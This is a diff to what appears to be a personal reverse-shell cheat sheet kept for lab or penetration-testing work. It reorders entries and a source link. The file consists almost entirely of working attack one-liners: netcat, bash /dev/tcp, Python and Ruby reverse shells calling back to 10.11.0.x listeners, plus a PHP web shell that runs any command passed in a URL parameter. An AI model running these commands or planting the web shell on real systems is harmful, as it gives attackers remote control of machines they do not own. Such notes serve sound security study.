@@ -1,3 +1,8 @@
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+# netcat
+```nc -e /bin/sh 10.11.0.130 443```
+
 # Simple bash revshell
 ```bash -i >& /dev/tcp/10.11.0.130/443 0>&1```
 
@@ -17,10 +22,6 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 # Ruby
 ```ruby -rsocket -e'f=TCPSocket.open("10.11.0.185",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d2>&%d",f,f,f)'```
-# netcat
-```nc -e /bin/sh 10.11.0.130 443```
-
--https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
 # PHP WebShell 
 ```<?php echo shell_exec($_GET['cmd']);?>```
